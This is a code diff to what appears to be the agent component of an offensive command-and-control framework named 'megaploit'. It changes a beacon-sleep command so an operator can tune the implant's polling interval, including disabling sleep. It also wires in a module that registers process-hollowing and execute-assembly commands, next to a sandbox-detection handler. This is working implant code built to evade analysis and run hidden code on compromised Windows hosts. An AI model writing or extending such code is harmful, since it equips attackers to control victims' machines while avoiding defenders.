@@ -735,15 +735,19 @@ def _sleep(conn, args: list[str]) -> str:
 @_register("beacon_sleep")
 def _beacon_sleep(conn, args: list[str]) -> str:
     """
-    Adjust the agent's reconnect delay (jitter-aware beacon timing).
+    Adjust the agent's beacon sleep interval (inter-command polling delay).
+    A value of 0 disables sleeping (legacy always-connected behaviour).
     Usage: beacon_sleep <seconds>
     """
     if not args or not args[0].isdigit():
         return "Usage: beacon_sleep <seconds>"
-    secs = max(1, min(int(args[0]), 3600))
+    secs = max(0, min(int(args[0]), 3600))
     try:
         from megaploit.core import config as _cfg
-        _cfg.RECONNECT_DELAY = secs  # type: ignore[attr-defined]
+        _cfg.RECONNECT_DELAY = max(secs, 1)  # type: ignore[attr-defined]
+        # Also update the shell-loop sleep variable in handlers module
+        from megaploit.agent import handlers as _hdl
+        _hdl._beacon_sleep = float(secs)
         return f"[+] Beacon sleep set to {secs}s"
     except Exception as exc:
         return f"[-] beacon_sleep: {exc}"
@@ -875,3 +879,11 @@ def _sandbox_check(conn, args: list[str]) -> str:
 
     header = "[*] Sandbox detection report:"
     return header + "\n" + "\n".join(results)
+
+# ---------------------------------------------------------------------------
+# Process hollowing + execute-assembly — import to register the handlers
+# ---------------------------------------------------------------------------
+try:
+    import megaploit.agent.hollowing  # noqa: F401  — registers process_hollow + execute_assembly
+except Exception:  # pragma: no cover — Windows-only, OK to skip on non-Windows
+    pass
